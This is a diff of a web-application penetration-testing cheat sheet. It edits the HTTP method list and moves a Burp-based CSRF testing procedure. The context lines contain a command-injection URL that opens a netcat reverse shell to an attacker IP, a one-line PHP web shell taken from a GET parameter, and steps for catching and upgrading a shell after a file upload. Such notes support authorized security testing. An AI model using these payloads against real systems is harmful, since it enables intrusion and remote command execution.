@@ -3,14 +3,15 @@ Web Apps
 
 # HTTP Methods or Verbs
 
-GET         Does not have a body and passes all parameters in the URL
-POST        Send data to a server. Passes all parameters in the body of the request
-PUT         Used for adding content to a web app, common with RESTful APIs
-DELETE      Used for deleting content from a web app, common with RESTful APIs
+GET         Used to get data from a server. Passes all parameters in the URL
+POST        Used to send data to a server. Passes all parameters in the body of the request
 HEAD        The web app will only return the response headers, not the body
 OPTIONS     Show a list of HTTP options that the server supports
 CONNECT     Set up a tunnel between a client and a server for SSL encryption or an HTTP proxy
 TRACE       Used for debugging
+TRACK       Returns the full HTTP request back to the requesting client for proxy-debugging
+PUT         Used for adding content to a web app, common with RESTful APIs
+DELETE      Used for deleting content from a web app, common with RESTful APIs
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # HTTP Response Codes
@@ -18,7 +19,7 @@ TRACE       Used for debugging
 100  Continue
 200  OK
 301  Moved Permanently
-302  Found
+302  Found (redireect)
 400  Bad Request
 401  Unauthorized
 403  Forbidden
@@ -60,6 +61,24 @@ http://target.com/test.php?cmd=nc -e /bin/sh <attacker IP> 443
 
 - PHP command injection using a GET request
 <?php echo system($_GET["cmd"]);?>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# CSRF
+
+Login to the target.
+Create a list of all POST requests that do not have a unique token called ‘CSRF_Token’.
+
+Proxy > HTTP history > Filter bar > Filter by search term
+    ^POST((?!CSRF_Token).)*$
+    Click Regex
+
+Right click on the first request > Engagement tools > Generate CSRF PoC
+Test in browser > Copy
+Open a new tab in Chromium > paste
+Look for evidence that it executed whatever that HTTP request was supposed to do.
+
+https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery-csrf
+https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Cross-site Scripting (XSS)
@@ -130,7 +149,9 @@ Upload the file.
 nc -lvnp 1234
 firefox http://<target IP>/uploads/test.php
 View your netcat listener for a shell.
-Upgrade your shell to a fully interactive tty: python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+Upgrade your shell to a fully interactive tty shell:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 - Example 2
 Create a PHP file called shell.php
@@ -595,24 +616,6 @@ Metasploit
 Add junk to the middle of a URL.
 Add a single tick (') at the end of a URL.
 Enter a single tick (') in any input field of a form and submit.
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# CSRF
-
-Login to the target.
-Create a list of all POST requests that do not have a unique token called ‘CSRF_Token’.
-
-Proxy > HTTP history > Filter bar > Filter by search term
-    ^POST((?!CSRF_Token).)*$
-    Click Regex
-
-Right click on the first request > Engagement tools > Generate CSRF PoC
-Test in browser > Copy
-Open a new tab in Chromium > paste
-Look for evidence that it executed whatever that HTTP request was supposed to do.
-
-https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery-csrf
-https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Manually Validate Findings
